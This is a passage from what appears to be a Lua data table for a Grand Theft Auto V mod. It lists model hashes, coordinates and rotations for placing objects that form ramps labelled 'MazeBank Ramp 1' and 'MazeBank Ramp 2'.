                            41.8672, -1, 0
                        },
                        {
                            2475986526, -97.9782, -797.316, 328.695, -5.58488,
                            -0, 48.9171, -1, 0
                        },
                        {
                            2475986526, -100.042, -800.063, 328.731, -5.79425,
                            2.13443, 53.7039, -1, 0
                        },
                        {
                            2475986526, -101.884, -802.718, 328.706, -5.5848,
                            2.13443, 60.3613, -1, 0
                        },
                        {
                            2475986526, -103.09, -805.421, 328.718, -5.79425,
                            -0, 64.506, -1, 0
                        },
                        {
                            2475986526, -104.284, -807.711, 328.691, -5.58488,
                            -2.13443, 65.966, -1, 0
                        },
                        {
                            2475986526, -105.262, -810.369, 328.729, -5.26384,
                            1.06722, 73.2414, -1, 0
                        },
                        {
                            2475986526, -105.769, -812.146, 328.645, -5.25205,
                            -1.06722, 75.8091, -1, 0
                        },
                        {
                            2475986526, -106.155, -814.128, 328.687, -5.26388,
                            -1.06722, 82.8157, -1, 0
                        },
                        {
                            2475986526, -106.062, -817.685, 328.758, -5.26388,
                            2.66804, 88.7458, -1, 0
                        },
                        {
                            2475986526, -106.154, -819.723, 328.716, -5.25204,
                            -0, 90.1628, -1, 0
                        },
                        {
                            2475986526, -106.082, -822.072, 328.729, -5.26387,
                            -1.33402, 91.2972, -1, 0
                        },
                        {
                            2475986526, -105.911, -823.815, 328.7, -5.52135,
                            5.33608, 99.4393, -1, 0
                        },
                        {
                            2475986526, -105.28, -826.029, 328.734, -5.26391,
                            1.06722, 101.615, -1, 0
                        },
                        {
                            2475986526, -105.06, -827.904, 328.644, -5.29978,
                            1.06722, 102.515, -1, 0
                        },
                        {
                            2475986526, -104.327, -830.112, 328.614, -5.26391,
                            -2.13443, 104.719, -1, 0
                        },
                        {
                            3291218330, -108.551, -853.416, 327.387, 2.94456,
                            89.1111, -166.155, -1, 0
                        },
                        {
                            3291218330, -80.2509, -866.418, 327.301, 3.7405,
                            89.3, 146.641, -1, 0
                        },
                        {
                            3291218330, -55.8513, -863.921, 327.333, 6.87468,
                            89.6184, 149.776, -1, 0
                        },
                        {
                            3291218330, -37.3907, -848.122, 327.717, 2.33633,
                            88.8797, -16.2595, -1, 0
                        },
                        {
                            3291218330, -26.1908, -818.332, 328.76, 0.490556,
                            84.6598, -18.107, -1, 0
                        },
                        {
                            3291218330, -37.891, -789.138, 328.134, 1.11673,
                            87.6571, 42.7186, -1, 0
                        },
                        {
                            3291218330, -63.492, -772.044, 327.866, 3.09962,
                            89.1556, 44.702, -1, 0
                        },
                        {
                            3291218330, -93.4916, -774.848, 327.398, 2.73771,
                            89.0443, 122.539, -1, 0
                        },
                        {
                            3291218330, -115.991, -795.259, 327.27, 3.28432,
                            89.2033, 123.086, -1, 0
                        },
                        {
                            3291218330, -122.551, -825.074, 327.213, 173.37,
                            89.6048, 4.27077, -1, 0
                        },
                        {
                            118627012, -74.8438, -819.617, 323.685, 0, 0,
                            -3.37511, -1, 0
                        },
                        {
                            2475986526, -67.6253, -820.244, 323.793, -14.4263,
                            -8.53774, -100.02, -1, 0
                        }
                    }
                }, {
                    'MazeBank Ramp 1', c._vector3(-75.72, -819.12, 327.5), {
                        {
                            1600026313, -78.4864, -807.943, 323.202, 109.364,
                            -89.9209, 0, -1, 1
                        },
                        {
                            1600026313, -79.2766, -805.701, 323.204, 109.364,
                            -89.9209, 0, -1, 1
                        },
                        {
                            1600026313, -79.8373, -803.709, 323.205, 109.364,
                            -89.9209, 0, -1, 1
                        },
                        {
                            1600026313, -80.4295, -801.947, 323.207, 109.364,
                            -89.9209, 0, -1, 1
                        },
                        {
                            4143853297, -97.4731, -778.557, 308.877, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            1087520462, -84.2429, -793.182, 321.08, -63.5625,
                            -0, -160.249, -1, 1
                        },
                        {
                            1087520462, -83.5429, -795.106, 322.073, -63.5625,
                            -0, -160.249, -1, 1
                        }, {
                            1087520462, -84.9429, -791.108, 319.956, -62.6673,
                            8.53774e-007, -160.249, -1, 1
                        },
                        {
                            1087520462, -85.8122, -788.585, 318.638, -63.5625,
                            -0, -160.249, -1, 1
                        },
                        {
                            1087520462, -89.1589, -779.487, 313.336, -59.5389,
                            0.0405551, -160.567, -1, 1
                        },
                        {
                            1087520462, -90.7065, -774.863, 310.09, -57.4959,
                            0.322988, -160.758, -1, 1
                        },
                        {
                            1087520462, -91.4887, -772.564, 308.403, -55.1692,
                            0.383369, -161.049, -1, 1
                        },
                        {
                            1087520462, -91.7565, -771.74, 307.844, -56.4466,
                            0.0442451, -160.565, -1, 1
                        },
                        {
                            1087520462, -93.6941, -766.245, 302.736, -45.9996,
                            0.0556114, -160.556, -1, 1
                        }, {
                            1087520462, -94.2969, -764.648, 301.067, -44.7623,
                            -1.70755e-006, -159.354, -1, 1
                        }, {
                            1087520462, -94.2969, -764.648, 301.067, -44.7623,
                            -1.70755e-006, -159.354, -1, 1
                        },
                        {
                            1087520462, -94.886, -762.996, 298.741, -36.7051,
                            -0, -159.354, -1, 1
                        },
                        {
                            1087520462, -95.4855, -761.334, 296.406, -36.7051,
                            -0, -159.354, -1, 1
                        },
                        {
                            1087520462, -95.4855, -761.334, 296.406, -36.7051,
                            -0, -159.354, -1, 1
                        },
                        {
                            1087520462, -96.1606, -759.499, 294.259, -42.0766,
                            -0, -159.354, -1, 1
                        },
                        {
                            1087520462, -96.0707, -759.689, 293.709, -36.7051,
                            -0, -159.354, -1, 1
                        },
                        {
                            1087520462, -96.0707, -759.689, 293.709, -36.7051,
                            -0, -159.354, -1, 1
                        },
                        {
                            1087520462, -96.0707, -759.689, 293.46, -36.7051,
                            -0, -159.354, -1, 1
                        }, {
                            1087520462, -96.8807, -757.391, 292.506, -51.0291,
                            -8.53774e-007, -159.354, -1, 1
                        }, {
                            1087520462, -96.8807, -757.391, 292.506, -51.0291,
                            -8.53774e-007, -159.354, -1, 1
                        },
                        {
                            1087520462, -97.3203, -756.159, 291.688, -57.2958,
                            -0, -159.354, -1, 1
                        }, {
                            1087520462, -97.9597, -754.358, 290.78, -62.6673,
                            8.53774e-007, -160.249, -1, 1
                        }, {
                            1087520462, -97.9597, -754.358, 290.78, -62.6673,
                            8.53774e-007, -160.249, -1, 1
                        }, {
                            1087520462, -98.7192, -752.356, 290.042, -69.9278,
                            3.20165e-005, -160.249, -1, 1
                        },
                        {
                            1087520462, -99.0244, -751.684, 290.499, -90,
                            -8.46346e-007, -160.249, -1, 1
                        },
                        {
                            1087520462, -99.3223, -750.534, 290.479, -90,
                            -8.46346e-007, -160.249, -1, 1
                        }, {
                            1087520462, -100.348, -747.881, 290.452, -89.5256,
                            -1.33402e-008, -159.354, -1, 1
                        },
                        {
                            1087520462, -100.26, -748.154, 290.462, -76.096,
                            4.26887e-007, 19.6954, -1, 1
                        }, {
                            1087520462, -100.687, -747.053, 290.731, -62.6673,
                            -8.53774e-007, 20.5907, -1, 1
                        }, {
                            1087520462, -101.346, -745.387, 291.611, -58.191,
                            1.70755e-006, 19.6954, -1, 1
                        },
                        {
                            1087520462, -102.234, -743.119, 293.091, -52.2249,
                            0.00051141, 21.3426, -1, 1
                        },
                        {
                            2475986526, -102.154, -739.285, 294.83, 9.80014,
                            0.295618, 18.7802, -1, 1
                        },
                        {
                            2475986526, -105.054, -740.282, 294.827, 9.80014,
                            0.295618, 18.7802, -1, 1
                        }, {
                            1087520462, -103.071, -741.047, 294.832, -48.0666,
                            0.000519094, 21.3419, -1, 1
                        },
                        {
                            1087520462, -103.75, -739.405, 296.413, -45.1472,
                            0.000547269, 21.3416, -1, 1
                        },
                        {
                            4143853297, -90.3515, -798.112, 319.893, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            4143853297, -93.2293, -790.348, 317.189, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            4143853297, -95.3479, -784.483, 313.696, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            4143853297, -100.01, -771.31, 304.367, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            4143853297, -101.829, -766.277, 299.666, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            4143853297, -103.318, -762.175, 293.966, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            4143853297, -104.948, -757.681, 288.866, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            4143853297, -108.146, -748.798, 288.866, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            4143853297, -108.146, -748.798, 295.608, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            4143853297, -108.225, -748.694, 302.608, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            3167053133, -103.451, -740.541, 307.317, -0.900199,
                            -1.19985, 20.9076, -1, 1
                        },
                        {
                            2375650849, -102.454, -742.6, 309.309, 0, 0,
                            20.9393, -1, 1
                        },
                        {
                            4143853297, -101.483, -746.044, 305.602, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            4143853297, -94.7458, -743.402, 295.608, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            4143853297, -94.7566, -743.406, 288.866, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            4143853297, -94.7426, -743.595, 302.651, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            1157292806, -99.7732, -750.516, 309.575, 0, 0,
                            24.1761, -1, 1
                        },
                        {
                            4143853297, -89.9785, -756.476, 293.966, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            4143853297, -91.5378, -752.285, 288.866, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            4143853297, -87.9094, -762.07, 299.666, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            4143853297, -86.2094, -766.939, 304.367, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            4143853297, -84.0215, -772.971, 309.575, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            4143853297, -81.6733, -779.348, 313.696, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            4143853297, -79.5187, -785.083, 317.189, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            4143853297, -76.5616, -793.191, 319.493, 0, -0,
                            -159.831, -1, 1
                        },
                        {
                            1998517203, -81.0993, -790.139, 326.57, 0, 0,
                            -82.6177, -1, 1
                        },
                        {
                            1998517203, -88.8988, -792.911, 326.95, 0, 0,
                            -82.6177, -1, 1
                        },
                        {
                            803874239, -88.3376, -794.173, 327.042, 0, 0,
                            31.5501, -1, 1
                        },
                        {
                            803874239, -90.0376, -795.174, 327.262, 0, 0,
                            31.5501, -1, 1
                        },
                        {
                            803874239, -91.6375, -796.175, 327.482, 0, 0,
                            31.5501, -1, 1
                        },
                        {
                            803874239, -79.0283, -791.31, 326.763, 0, -0,
                            100.953, -1, 1
                        },
                        {
                            803874239, -76.8377, -790.87, 326.823, 0, -0,
                            100.953, -1, 1
                        },
                        {
                            803874239, -81.0088, -791.22, 326.713, 0, -0,
                            100.953, -1, 1
                        }
                    }
                }, {
                    'MazeBank Ramp 2', c._vector3(-75.72, -819.12, 327.5), {
                        {
                            3522933110, -81.3886, -814.648, 325.169, 0, -0, 180,
                            -1, 7
                        },
                        {
                            3681122061, -81.7456, -809.064, 324.799, 0.500021,
                            2.66804, 32.8808, -1, 7
                        },
                        {
                            3681122061, -86.1333, -802.279, 321.92, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -89.7406, -796.701, 316.539, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -93.601, -790.725, 310.777, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -97.4741, -784.73, 304.997, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -101.373, -778.696, 299.179, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -105.233, -772.72, 293.417, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -109.106, -766.725, 287.637, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -112.954, -760.769, 281.894, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -116.827, -754.773, 276.113, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -120.687, -748.798, 270.352, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -124.518, -742.868, 264.636, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -128.358, -736.925, 258.909, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -132.22, -730.949, 253.151, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -136.081, -724.974, 247.394, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -139.943, -718.998, 241.636, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -143.826, -712.99, 235.846, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -147.667, -707.047, 230.12, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -151.508, -701.104, 224.394, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -155.369, -695.128, 218.636, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -159.252, -689.12, 212.846, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -163.072, -683.209, 207.152, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -166.976, -677.168, 201.331, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -170.838, -671.193, 195.573, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -174.7, -665.217, 189.815, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -178.583, -659.209, 184.026, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -182.444, -653.233, 178.268, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -186.327, -647.225, 172.479, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -190.189, -641.249, 166.721, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -194.03, -635.306, 160.994, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -197.871, -629.363, 155.268, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -201.711, -623.42, 149.542, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -205.552, -617.477, 143.815, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -209.393, -611.534, 138.089, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -213.255, -605.559, 132.331, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -217.095, -599.616, 126.605, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -220.957, -593.64, 120.847, -38.9999,
                            -1.45141, 32.8808, -1, 7
                        },
                        {
                            3681122061, -222.245, -591.648, 118.928, -33.8999,
                            1.02453, 32.8807, -1, 7
                        },
                        {
                            3681122061, -223.349, -589.94, 117.561, -29.31,
                            1.79292, 32.8808, -1, 7
                        },
                        {
                            3681122061, -224.58, -588.036, 116.288, -26.25,
                            5.12264, 32.8807, -1, 7
                        },
                        {
                            3681122061, -225.869, -586.04, 115.116, -24.7199,
                            -1.10991, 32.8808, -1, 7
                        },
                        {
                            3681122061, -227.127, -584.095, 114.05, -21.6599,
                            1.8783, 32.8808, -1, 7
                        },
                        {
                            3681122061, -228.615, -581.794, 112.961, -19.6199,
                            1.02453, 32.8807, -1, 7
                        },
                        {
                            3681122061, -230.201, -579.341, 111.92, -17.0699,
                            -0, 32.8807, -1, 7
                        },
                        {
                            3681122061, -232.121, -576.369, 110.833, -12.9899,
                            4.26887, 32.8808, -1, 7
                        },
                        {
                            3681122061, -234.105, -573.302, 109.991, -9.9299,
                            -2.98821, 32.8807, -1, 7
                        },
                        {
                            3681122061, -236.628, -569.396, 109.329, -7.3799,
                            -4.26887, 32.8807, -1, 7
                        },
                        {
                            3681122061, -239.81, -564.475, 108.721, -4.3199,
                            1.28066, 32.8807, -1, 7
                        },
                        {
                            3681122061, -241.76, -561.459, 108.549, -0.7499,
                            -1.12058, 32.8807, -1, 7
                        },
                        {
                            3681122061, -244.04, -557.932, 108.494, 2.82011,
                            -2.77476, 32.8807, -1, 7
                        },
                        {
                            3681122061, -246.372, -554.326, 108.705, 5.8801,
                            -2.77476, 32.8807, -1, 7
                        },
                        {
                            3681122061, -248.668, -550.777, 109.14, 10.4701,
                            8.96462, 32.8806, -1, 7
                        },
                        {
                            3681122061, -251.664, -546.138, 110.313, 13.5301,
                            1.15259, 32.8806, -1, 7
                        },
                        {
                            3681122061, -254.537, -541.694, 111.791, 16.5901,
                            4.26887, 32.8807, -1, 7
                        },
                        {
                            3681122061, -256.28, -538.999, 112.748, 19.6501,
                            -1.19528, 32.8807, -1, 7
                        },
                        {
                            3681122061, -65.9078, -814.752, 326.106, 19.89,
                            4.26887, -53.8105, -1, 7
                        },
                        {
                            3681122061, -58.6541, -809.444, 327.336, -4.08004,
                            -2.13443, -53.8103, -1, 7
                        },
                        {
                            3681122061, -52.4476, -804.909, 323.715, -45.3899,
                            2.56132, -53.8101, -1, 7
                        },
                        {
                            3681122061, -47.2332, -801.09, 317.168, -45.3899,
                            2.56132, -53.8101, -1, 7
                        },
                        {
                            3681122061, -42.0187, -797.272, 310.621, -45.3899,
                            2.56132, -53.8101, -1, 7
                        },
                        {
                            3681122061, -36.8326, -793.474, 304.109, -45.3899,
                            2.56132, -53.8101, -1, 7
                        },
                        {
                            3681122061, -31.5898, -789.635, 297.526, -45.3899,
                            2.56132, -53.8101, -1, 7
                        },
                        {
                            3681122061, -26.4037, -785.838, 291.014, -45.3899,
                            2.56132, -53.8101, -1, 7
                        },
                        {
                            3681122061, -21.1893, -782.019, 284.467, -45.3899,
                            2.56132, -53.8101, -1, 7
                        },
                        {
                            3681122061, -15.9748, -778.201, 277.919, -45.3899,
                            2.56132, -53.8101, -1, 7
                        },
                        {
                            3681122061, -10.7604, -774.383, 271.372, -45.3899,
                            2.56132, -53.8101, -1, 7
                        },
                        {
                            3681122061, -5.57426, -770.585, 264.86, -45.3899,
                            2.56132, -53.8101, -1, 7
                        },
                        {
                            3681122061, -0.359839, -766.767, 258.313, -45.3899,
                            2.56132, -53.8101, -1, 7
                        },
                        {
                            3681122061, 4.82623, -762.969, 251.799, -45.3899,
                            2.56132, -53.8101, -1, 7
                        },
                        {
                            3681122061, 10.0123, -759.171, 245.285, -45.3899,
                            2.56132, -53.8101, -1, 7
                        },
                        {
                            3681122061, 15.2268, -755.353, 238.735, -45.3899,
                            2.56132, -53.8101, -1, 7
                        },
                        {
                            3681122061, 20.4412, -751.535, 232.184, -45.3899,
                            2.56132, -53.8101, -1, 7
                        },
                        {
                            3681122061, 25.6273, -747.737, 225.67, -45.3899,
                            2.56132, -53.8101, -1, 7
                        },
                        {
                            3681122061, 30.8135, -743.939, 219.155, -45.3899,
                            2.56132, -53.8101, -1, 7
                        },
                        {
                            3681122061, 36.0279, -740.121, 212.605, -45.3899,
                            2.56132, -53.8101, -1, 7
                        },
                        {
                            3681122061, 41.214, -736.323, 206.091, -45.3899,
                            2.56132, -53.8101, -1, 7
                        },
                        {
                            3681122061, 46.4285, -732.505, 199.54, -45.3899,
                            2.56132, -53.8101, -1, 7
                        },
                        {
                            3681122061, 48.4122, -731.052, 197.049, -41.8198,
                            1.62217, -53.8101, -1, 7
                        },
                        {
                            3681122061, 49.5549, -730.218, 195.782, -38.2499,
                            3.24434, -53.8101, -1, 7
                        },
                        {
                            3681122061, 51.171, -729.035, 194.203, -36.2098,
                            2.39057, -53.81, -1, 7
                        },
                        {
                            3681122061, 52.8966, -727.773, 192.637, -33.1499,
                            -6.83019, -53.8101, -1, 7
                        },
                        {
                            3681122061, 54.586, -726.537, 191.27, -30.0898,
                            8.70849, -53.8099, -1, 7
                        },
                        {
                            3681122061, 56.5413, -725.105, 189.866, -25.4998,
                            7.59859, -53.8099, -1, 7
                        },
                        {
                            3681122061, 58.8359, -723.425, 188.509, -22.4398,
                            4.26887, -53.81, -1, 7
                        },
                        {
                            3681122061, 60.738, -722.033, 187.536, -18.3599,
                            1.10991, -53.81, -1, 7
                        },
                        {
                            3681122061, 63.1509, -720.268, 186.544, -15.8098,
                            5.03727, -53.8099, -1, 7
                        },
                        {
                            3681122061, 65.131, -718.821, 185.849, -12.7498,
                            5.07995, -53.8099, -1, 7
                        },
                        {
                            3681122061, 67.1384, -717.352, 185.286, -9.17981,
                            4.78113, -53.81, -1, 7
                        },
                        {
                            3681122061, 69.2894, -715.776, 184.855, -4.5898,
                            4.18349, -53.8099, -1, 7
                        },
                        {
                            3681122061, 71.7831, -713.952, 184.607, 0.000193536,
                            4.16213, -53.8099, -1, 7
                        },
                        {
                            3681122061, 74.0832, -712.268, 184.607, 3.06019,
                            3.7566, -53.81, -1, 7
                        },
                        {
                            3681122061, 76.0175, -710.853, 184.736, 8.1602,
                            4.35424, -53.81, -1, 7
                        },
                        {
                            3681122061, 77.7752, -709.567, 185.048, 13.2602,
                            5.50684, -53.81, -1, 7
                        },
                        {
                            3681122061, 79.6997, -708.158, 185.61, 17.3402,
                            3.7566, -53.8099, -1, 7
                        },
                        {
                            3681122061, 81.3947, -706.918, 186.266, 21.9302,
                            4.26887, -53.81, -1, 7
                        },
                        {
                            3681122061, 83.3036, -705.52, 187.219, 26.0102,
                            9.39151, -53.8099, -1, 7
                        },
                        {
                            3681122061, 85.6244, -703.821, 188.622, 29.0702,
                            1.96368, -53.8099, -1, 7
                        },
                        {
                            3681122061, 87.3526, -702.556, 189.812, 33.1501,
                            2.90283, -53.8098, -1, 7
                        },
                        {
                            3681122061, 89.2107, -701.196, 191.316, 37.2301,
                            4.86651, -53.8098, -1, 7
                        },
                        {
                            3681122061, 90.8492, -699.998, 192.859, 41.82,
                            -2.56132, -53.8099, -1, 7
                        },
                        {
                            3681122061, 92.6236, -698.701, 194.826, 46.41,
                            8.2816, -53.8099, -1, 7
                        },
                        {
                            3681122061, 94.2096, -697.539, 196.89, 52.0199,
                            6.57406, -53.8098, -1, 7
                        },
                        {
                            3681122061, 95.6251, -696.503, 199.137, 56.61,
                            9.22075, -53.8097, -1, 7
                        },
                        {
                            3681122061, 96.9799, -695.512, 201.683, 61.7098,
                            8.53774, -53.8097, -1, 7
                        },
                        {
                            3681122061, 98.1658, -694.646, 204.413, 65.7899,
                            5.03726, -53.8096, -1, 7
                        },
                        {
                            3681122061, -69.0186, -829.452, 324.775, 0, -0,
                            -152.398, -1, 7
                        },
                        {
                            3681122061, -65.276, -836.288, 321.491, -44.8796,
                            3.24434, -152.398, -1, 7
                        },
                        {
                            3681122061, -62.2554, -842.061, 315, -44.8796,
                            3.24434, -152.398, -1, 7
                        },
                        {
                            3681122061, -59.2515, -847.802, 308.544, -44.8796,
                            3.24434, -152.398, -1, 7
                        },
                        {
                            3681122061, -56.2313, -853.574, 302.053, -44.8796,
                            3.24434, -152.398, -1, 7
                        },
                        {
                            3681122061, -53.1945, -859.378, 295.526, -44.8796,
                            3.24434, -152.398, -1, 7
                        },
                        {
                            3681122061, -50.2071, -865.088, 289.106, -44.8796,
                            3.24434, -152.398, -1, 7
                        },
                        {
                            3681122061, -47.2032, -870.829, 282.65, -44.8796,
                            3.24434, -152.398, -1, 7
                        },
                        {
                            3681122061, -44.1829, -876.602, 276.159, -44.8796,
                            3.24434, -152.398, -1, 7
                        },
                        {
                            3681122061, -41.1626, -882.374, 269.667, -44.8796,
                            3.24434, -152.398, -1, 7
                        },
                        {
                            3681122061, -38.1751, -888.084, 263.247, -44.8796,
                            3.24434, -152.398, -1, 7
                        },
                        {
                            3681122061, -35.1713, -893.825, 256.791, -44.8796,
                            3.24434, -152.398, -1, 7
                        },
                        {
                            3681122061, -32.1674, -899.566, 250.335, -44.8796,
                            3.24434, -152.398, -1, 7
                        },
                        {
                            3681122061, -29.1635, -905.307, 243.879, -44.8796,
                            3.24434, -152.398, -1, 7
                        },
                        {
                            3681122061, -26.1432, -911.079, 237.388, -44.8796,
                            3.24434, -152.398, -1, 7
                        },
                        {
                            3681122061, -23.1393, -916.821, 230.932, -44.8796,
                            3.24434, -152.398, -1, 7
                        },
                        {
                            3681122061, -20.119, -922.593, 224.44, -44.8796,
                            3.24434, -152.398, -1, 7
                        },
                        {
                            3681122061, -17.1152, -928.334, 217.985, -44.8796,
                            3.24434, -152.398, -1, 7
                        },
                        {
                            3681122061, -14.1112, -934.075, 211.529, -44.8796,
                            3.24434, -152.398, -1, 7
                        },
                        {
                            3681122061, -11.1235, -939.785, 205.108, -44.8796,
                            3.24434, -152.398, -1, 7
                        },
                        {
                            3681122061, -8.13589, -945.495, 198.687, -44.8796,
                            3.24434, -152.398, -1, 7
                        },
                        {
                            3681122061, -5.28891, -951.101, 192.102, -47.4298,
                            -1.79292, -151.734, -1, 7
                        },
                        {
                            3681122061, -2.35757, -956.552, 185.364, -47.4298,
                            -1.79292, -151.734, -1, 7
                        },
                        {
                            3681122061, 0.589775, -962.033, 178.59, -47.4298,
                            -1.79292, -151.734, -1, 7
                        },
                        {
                            3681122061, 3.5211, -967.483, 171.852, -47.4298,
                            -1.79292, -151.734, -1, 7
                        },
                        {
                            3681122061, 9.3998, -978.414, 158.339, -47.4298,
                            -1.79292, -151.734, -1, 7
                        },
                        {
                            3681122061, 6.46847, -972.964, 165.077, -47.4298,
                            -1.79292, -151.734, -1, 7
                        },
                        {
                            3681122061, 12.3311, -983.865, 151.601, -47.4298,
                            -1.79292, -151.734, -1, 7
                        },
                        {
                            3681122061, 15.2944, -989.375, 144.789, -47.4298,
                            -1.79292, -151.734, -1, 7
                        },
                        {
                            3681122061, 21.1569, -1000.28, 131.313, -47.4298,
                            -1.79292, -151.734, -1, 7
                        },
                        {
                            3681122061, 18.2417, -994.856, 138.014, -47.4298,
                            -1.79292, -151.734, -1, 7
                        },
                        {
                            3681122061, 24.0722, -1005.7, 124.612, -47.4298,
                            -1.79292, -151.734, -1, 7
                        },
                        {
                            3681122061, 27.0355, -1011.21, 117.801, -47.4298,
                            -1.79292, -151.734, -1, 7
                        },
                        {
                            3681122061, 29.9828, -1016.69, 111.026, -47.4298,
                            -1.79292, -151.734, -1, 7
                        },
                        {
                            3681122061, 35.8294, -1027.56, 97.5867, -47.4298,
                            -1.79292, -151.734, -1, 7
                        },
                        {
                            3681122061, 37.2241, -1030.15, 94.4555, -44.3698,
                            -1.70754, -151.734, -1, 7
                        },
                        {
                            3681122061, 38.7475, -1032.99, 91.3086, -39.7798,
                            -4.26887, -151.734, -1, 7
                        },
                        {
                            3681122061, 39.7483, -1034.85, 89.5491, -36.7197,
                            3.4151, -151.734, -1, 7
                        },
                        {
                            3681122061, 40.9818, -1037.14, 87.6062, -33.6597,
                            -2.21981, -151.734, -1, 7
                        },
                        {
                            3681122061, 42.1248, -1039.27, 85.999, -30.0898,
                            -1.96368, -151.734, -1, 7
                        },
                        {
                            3681122061, 32.9141, -1022.14, 104.288, -47.4298,
                            -1.79292, -151.734, -1, 7
                        },
                        {
                            3681122061, 43.3132, -1041.47, 84.5449, -26.5197,
                            -1.79293, -151.734, -1, 7
                        },
                        {
                            3681122061, 44.7115, -1044.08, 83.0715, -23.4597,
                            -2.39056, -151.734, -1, 7
                        },
                        {
                            3681122061, 45.9496, -1046.38, 81.937, -20.3997,
                            -2.47594, -151.734, -1, 7
                        },
                        {
                            3681122061, 47.0815, -1048.48, 81.0483, -17.3397,
                            -2.09174, -151.734, -1, 7
                        },
                        {
                            3681122061, 48.302, -1050.75, 80.2436, -14.7897,
                            -8.96462, -151.734, -1, 7
                        },
                        {
                            3681122061, 50.0647, -1054.03, 79.2608, -13.2597,
                            -2.77476, -151.734, -1, 7
                        },
                        {
                            3681122061, 52.0238, -1057.67, 78.2861, -11.7297,
                            -1.45141, -151.734, -1, 7
                        },
                        {
                            3681122061, 53.7395, -1060.86, 77.5341, -9.17973,
                            -1.1099, -151.734, -1, 7
                        },
                        {
                            3681122061, 55.7265, -1064.56, 76.8558, -6.11973,
                            -6.61674, -151.734, -1, 7
                        },
                        {
                            3681122061, 57.3746, -1067.62, 76.4825, -3.56972,
                            -9.60496, -151.734, -1, 7
                        }, {
                            3681122061, 59.3125, -1071.23, 76.2272, 0.000276446,
                            -9.05818, -151.734, -1, 7
                        },
                        {
                            3681122061, 61.112, -1074.58, 76.2272, 4.08028,
                            -8.00412, -151.734, -1, 7
                        },
                        {
                            3681122061, 62.529, -1077.21, 76.4405, 7.65027,
                            -7.04364, -151.734, -1, 7
                        },
                        {
                            3681122061, 64.0779, -1080.1, 76.8796, 10.7103,
                            -1.28066, -151.734, -1, 7
                        },
                        {
                            3681122061, 65.9388, -1083.55, 77.623, 14.2802,
                            -1.70755, -151.734, -1, 7
                        },
                        {
                            3681122061, 67.4076, -1086.29, 78.4126, 17.3403,
                            -1.57948, -151.734, -1, 7
                        },
                        {
                            3681122061, 68.7639, -1088.81, 79.3066, 21.4202,
                            1.36604, -151.734, -1, 7
                        },
                        {
                            3681122061, -86.0915, -825.576, 324.775, 0, -0,
                            122.286, -1, 7
                        },
                        {
                            3681122061, -99.1939, -833.684, 315.911, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
                        {
                            3681122061, -105.248, -837.511, 310.056, -39.27,
                            -2.30519, 122.286, -1, 7
                        },
